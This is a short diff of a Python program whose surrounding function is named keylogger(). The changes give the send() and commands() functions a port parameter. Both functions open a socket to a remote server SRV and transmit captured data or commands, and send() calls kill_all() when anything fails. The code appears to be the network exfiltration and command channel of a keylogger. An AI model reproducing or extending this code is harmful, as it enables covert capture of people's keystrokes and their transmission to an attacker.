@@ -107,27 +107,26 @@ def keylogger():
         listener.join()
 
 
-def send(data):
+def send(data, port):
+
     try:
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-        client_socket.connect((SRV, PORT))
+        if port != PORT :
+            client_socket.connect((SRV, port))
+        else :
+            client_socket.connect((SRV, PORT))
 
         client_socket.send(data.encode('utf-8'))  # envoi
-
         client_socket.close()
-
-    except TimeoutError:
-
+    except:
         kill_all()
 
-    # print(data)
 
 
-def commands(cmd):
+def commands(cmd, port):
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    client_socket.connect((SRV, PORT))
+    client_socket.connect((SRV, port))
 
     client_socket.send(cmd.encode('utf-8'))  # envoi
 
